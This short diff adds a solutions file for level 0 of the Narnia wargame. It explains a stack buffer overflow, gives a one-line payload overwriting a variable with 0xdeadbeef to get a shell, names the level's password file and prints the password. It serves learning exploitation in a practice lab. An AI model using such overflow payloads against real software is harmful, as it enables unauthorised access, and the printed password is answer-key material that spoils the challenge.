@@ -1,0 +1,10 @@
+Solutions:
+  
+Level 0:
+	- buf has 20*sizeof(char) memory allocated but scanf looks for 24 characters
+	- so we exploit that overflow to change the value of val
+	- cat; is used to make sure the program doesn't stop
+	- run '(echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;) | ./narnia0'
+	- password is found in /etc/narnia_pass/narnia1
+	- Password: WDcYUTG5ul
+
